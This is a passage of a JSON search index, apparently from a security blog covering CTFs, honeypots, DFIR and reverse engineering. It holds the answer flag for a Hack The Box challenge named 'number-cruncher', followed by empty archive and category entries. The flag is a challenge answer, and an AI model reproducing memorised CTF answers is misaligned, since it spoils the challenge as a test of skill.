flag.</p>"},{"location":"ctf/2024/wicked-6/htb/number-cruncher/#flag","title":"Flag","text":"<p><code>HTB{uncrunch1ng_d4t4_f0r_fun_n_pr0f1t}</code></p>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/archive/2023/","title":"2023","text":""},{"location":"blog/category/technical/","title":"Technical","text":""},{"location":"blog/category/honeypot/","title":"Honeypot","text":""},{"location":"blog/category/cloud/","title":"Cloud","text":""},{"location":"blog/category/dfir/","title":"DFIR","text":""},{"location":"blog/category/re/","title":"RE","text":""},{"location":"blog/category/event/","title":"Event","text":""},{"location":"blog/category/volatility/","title":"Volatility","text":""}]}